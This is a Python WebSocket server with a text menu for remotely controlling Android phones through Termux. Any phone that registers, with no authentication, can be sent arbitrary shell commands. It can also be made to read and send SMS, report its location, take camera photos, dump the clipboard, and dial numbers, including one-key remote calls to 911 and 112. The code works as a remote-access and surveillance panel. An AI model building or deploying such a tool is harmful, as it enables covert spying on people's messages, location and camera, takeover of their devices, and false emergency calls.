#!/usr/bin/env python3
import asyncio
import websockets
import json
import os
from datetime import datetime
from typing import Dict, List

# Railway Configuration
PORT = int(os.environ.get("PORT", 8080))
HOST = "0.0.0.0"

class PhoneManager:
    def __init__(self):
        self.connected_phones: Dict = {}
    
    async def register_phone(self, phone_id: str, websocket):
        self.connected_phones[phone_id] = {
            'websocket': websocket,
            'connected_at': datetime.now(),
            'last_seen': datetime.now()
        }
        print(f"✅ {phone_id} - CONNECTED (Total: {len(self.connected_phones)})")
    
    async def handle_phone_message(self, message: str, websocket):
        try:
            data = json.loads(message)
            if data.get('type') == 'register':
                await self.register_phone(data['device_id'], websocket)
        except:
            pass
    
    async def send_command(self, phone_id: str, command: str) -> bool:
        if phone_id in self.connected_phones:
            try:
                await self.connected_phones[phone_id]['websocket'].send(
                    json.dumps({"action": "shell", "command": command})
                )
                self.connected_phones[phone_id]['last_seen'] = datetime.now()
                return True
            except:
                del self.connected_phones[phone_id]
        return False
    
    async def send_dial_command(self, phone_id: str, number: str) -> bool:
        return await self.send_command(phone_id, f'termux-telephony-call "{number}"')
    
    async def send_sms_command(self, phone_id: str, number: str, message: str) -> bool:
        return await self.send_command(phone_id, f'termux-sms-send -n "{number}" "{message}"')
    
    async def get_sms(self, phone_id: str) -> bool:
        return await self.send_command(phone_id, "termux-sms-list -l 20")
    
    def get_connected_phones(self) -> List[str]:
        return list(self.connected_phones.keys())

phone_manager = PhoneManager()

async def handle_phone_connection(websocket, path):
    try:
        async for message in websocket:
            await phone_manager.handle_phone_message(message, websocket)
    except:
        pass

class PhoneControllerUI:
    def __init__(self):
        self.selected_phone = None
        self.current_screen = "main"
        self.sms_data = {}
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self, title: str):
        print("┌" + "─" * 78 + "┐")
        print(f"│ {title:^76} │")
        print("└" + "─" * 78 + "┘")
    
    def print_server_info(self):
        print(f"\n📍 Server URL: ws://YOUR_APP.railway.app")
        print(f"📡 Internal: {HOST}:{PORT}")
        print(f"🕒 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    def print_connected_phones(self):
        phones = phone_manager.get_connected_phones()
        print("\n📱 CONNECTED PHONES:")
        print("─" * 80)
        
        if not phones:
            print("   No phones connected - waiting for connections...")
            return
        
        for i, phone in enumerate(phones, 1):
            status = "🟢 SELECTED" if phone == self.selected_phone else "🟢 ONLINE"
            print(f"{i:2}. {phone:<50} {status}")
    
    def show_main_menu(self):
        self.clear_screen()
        self.print_header("PHONE CONTROLLER SERVER - RAILWAY DEPLOYMENT")
        self.print_server_info()
        self.print_connected_phones()
        
        print("\n🎮 MAIN MENU:")
        print("─" * 80)
        if self.selected_phone:
            print(f"📞 [1] Dialer Pad      (Selected: {self.selected_phone})")
            print("💬 [2] SMS Manager")
            print("⚡ [3] Command Terminal")
            print("🔄 [4] Select Different Phone")
        else:
            print("👆 [1] Select a Phone to Begin")
        
        print("📊 [5] Refresh Status")
        print("🌐 [6] Server Info")
        print("❌ [7] Exit")
        print("─" * 80)
    
    def show_dialer_pad(self):
        self.clear_screen()
        self.print_header(f"DIALER PAD - {self.selected_phone}")
        
        print("\n" + " " * 25 + "┌───┬───┬───┐")
        print(" " * 25 + "│ 1 │ 2 │ 3 │")
        print(" " * 25 + "├───┼───┼───┤")
        print(" " * 25 + "│ 4 │ 5 │ 6 │")
        print(" " * 25 + "├───┼───┼───┤")
        print(" " * 25 + "│ 7 │ 8 │ 9 │")
        print(" " * 25 + "├───┼───┼───┤")
        print(" " * 25 + "│ * │ 0 │ # │")
        print(" " * 25 + "└───┴───┴───┘")
        
        print("\n📞 QUICK DIAL:")
        print("  [1] Call 911")
        print("  [2] Call 112")
        print("  [3] Call Home (555-1234)")
        
        print("\n🔧 OPTIONS:")
        print("  [d] Enter Number to Dial")
        print("  [u] Send USSD Code")
        print("  [b] Back to Main Menu")
        print("─" * 80)
    
    def show_sms_manager(self):
        self.clear_screen()
        self.print_header(f"SMS MANAGER - {self.selected_phone}")
        
        print("\n💬 SMS ACTIONS:")
        print("─" * 80)
        print("  [1] View Recent SMS (Last 10)")
        print("  [2] Send New SMS")
        print("  [3] Get SMS Inbox (Last 50)")
        print("  [b] Back to Main Menu")
        print("─" * 80)
    
    def show_command_terminal(self):
        self.clear_screen()
        self.print_header(f"COMMAND TERMINAL - {self.selected_phone}")
        
        print("\n⚡ QUICK COMMANDS:")
        print("─" * 80)
        print("  [1] Vibrate Device")
        print("  [2] Show Toast Message")
        print("  [3] Get Battery Status")
        print("  [4] Get Location")
        print("  [5] Send Notification")
        print("  [6] Take Photo")
        print("  [7] Get Clipboard")
        
        print("\n🎯 CUSTOM COMMAND:")
        print("  [c] Enter custom Termux command")
        print("  [b] Back to Main Menu")
        print("─" * 80)
    
    def show_server_info(self):
        self.clear_screen()
        self.print_header("SERVER INFORMATION")
        
        print(f"\n📍 Public URL: ws://YOUR_APP.railway.app")
        print(f"📡 Internal: {HOST}:{PORT}")
        print(f"🚀 Status: RUNNING")
        print(f"📱 Connected Phones: {len(phone_manager.connected_phones)}")
        print(f"🕒 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n🔧 Deployment: Railway")
        print("💾 Platform: Cloud")
        print("🌐 Protocol: WebSocket")
        
        print("\nPress Enter to return...")
        input()
    
    def select_phone(self):
        phones = phone_manager.get_connected_phones()
        if not phones:
            input("❌ No phones connected. Press Enter to continue...")
            return
        
        self.clear_screen()
        self.print_header("SELECT PHONE")
        self.print_connected_phones()
        
        try:
            choice = int(input(f"\nSelect phone (1-{len(phones)}): "))
            if 1 <= choice <= len(phones):
                self.selected_phone = phones[choice - 1]
                print(f"✅ Selected: {self.selected_phone}")
            else:
                print("❌ Invalid selection")
        except ValueError:
            print("❌ Please enter a valid number")
        
        input("\nPress Enter to continue...")
    
    async def handle_dialer_input(self):
        while True:
            self.show_dialer_pad()
            choice = input("\nEnter choice: ").strip().lower()
            
            if choice == 'b':
                break
            elif choice == 'd':
                number = input("Enter phone number: ").strip()
                if number:
                    success = await phone_manager.send_dial_command(self.selected_phone, number)
                    if success:
                        print(f"✅ Dialing: {number}")
                    else:
                        print("❌ Failed to send dial command")
                    input("\nPress Enter to continue...")
            elif choice == 'u':
                ussd = input("Enter USSD code: ").strip()
                if ussd:
                    success = await phone_manager.send_command(self.selected_phone, f'termux-telephony-call "*{ussd}"')
                    if success:
                        print(f"✅ USSD sent: {ussd}")
                    input("\nPress Enter to continue...")
            elif choice in ['1', '2', '3']:
                emergency_numbers = {'1': '911', '2': '112', '3': '555-1234'}
                number = emergency_numbers[choice]
                success = await phone_manager.send_dial_command(self.selected_phone, number)
                if success:
                    print(f"✅ Dialing: {number}")
                input("\nPress Enter to continue...")
    
    async def handle_sms_input(self):
        while True:
            self.show_sms_manager()
            choice = input("\nEnter choice: ").strip().lower()
            
            if choice == 'b':
                break
            elif choice == '1':
                success = await phone_manager.send_command(self.selected_phone, "termux-sms-list -l 10")
                if success:
                    print("✅ Requested recent SMS")
                input("\nPress Enter to continue...")
            elif choice == '2':
                number = input("Enter recipient number: ").strip()
                if number:
                    message = input("Enter message: ").strip()
                    if message:
                        success = await phone_manager.send_sms_command(self.selected_phone, number, message)
                        if success:
                            print("✅ SMS sent successfully")
                input("\nPress Enter to continue...")
            elif choice == '3':
                success = await phone_manager.send_command(self.selected_phone, "termux-sms-list -l 50")
                if success:
                    print("✅ Requested SMS inbox")
                input("\nPress Enter to continue...")
    
    async def handle_terminal_input(self):
        while True:
            self.show_command_terminal()
            choice = input("\nEnter choice: ").strip().lower()
            
            if choice == 'b':
                break
            elif choice == 'c':
                cmd = input("Enter Termux command: ").strip()
                if cmd:
                    success = await phone_manager.send_command(self.selected_phone, cmd)
                    if success:
                        print(f"✅ Command sent: {cmd}")
                    input("\nPress Enter to continue...")
            elif choice in ['1', '2', '3', '4', '5', '6', '7']:
                commands = {
                    '1': 'termux-vibrate -d 1000',
                    '2': 'termux-toast "Hello from Railway Server"',
                    '3': 'termux-battery-status',
                    '4': 'termux-location',
                    '5': 'termux-notification --title "Railway Alert" --content "Message from Cloud Server"',
                    '6': 'termux-camera-photo -c 0 /sdcard/railway_photo.jpg',
                    '7': 'termux-clipboard-get'
                }
                cmd = commands[choice]
                success = await phone_manager.send_command(self.selected_phone, cmd)
                if success:
                    print(f"✅ Command sent: {cmd}")
                input("\nPress Enter to continue...")
    
    async def run_interface(self):
        while True:
            self.show_main_menu()
            choice = input("\nEnter choice: ").strip()
            
            if choice == '1':
                if not self.selected_phone:
                    self.select_phone()
                else:
                    await self.handle_dialer_input()
            elif choice == '2' and self.selected_phone:
                await self.handle_sms_input()
            elif choice == '3' and self.selected_phone:
                await self.handle_terminal_input()
            elif choice == '4':
                self.select_phone()
            elif choice == '5':
                continue  # Refresh screen
            elif choice == '6':
                self.show_server_info()
            elif choice == '7':
                print("👋 Shutting down server...")
                break
            else:
                print("❌ Invalid choice or no phone selected")
                input("Press Enter to continue...")

async def main():
    # Start WebSocket server
    print("🚀 Starting Phone Controller Server on Railway...")
    print(f"📡 Binding to {HOST}:{PORT}")
    
    try:
        server = await websockets.serve(handle_phone_connection, HOST, PORT)
        print(f"✅ WebSocket server started successfully!")
        print(f"📍 Your server URL: ws://YOUR_APP.railway.app")
        print(f"👂 Listening for phone connections...\n")
        
        # Start UI
        ui = PhoneControllerUI()
        await ui.run_interface()
        
        # Cleanup
        server.close()
        await server.wait_closed()
        
    except Exception as e:
        print(f"❌ Failed to start server: {e}")
        print("💡 Check if the port is available and Railway environment is proper")

if __name__ == "__main__":
    print("=" * 80)
    print("🎯 PHONE CONTROLLER SERVER - RAILWAY DEPLOYMENT")
    print("=" * 80)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Server stopped by user")
    except Exception as e:
        print(f"\n💥 Server crashed: {e}")
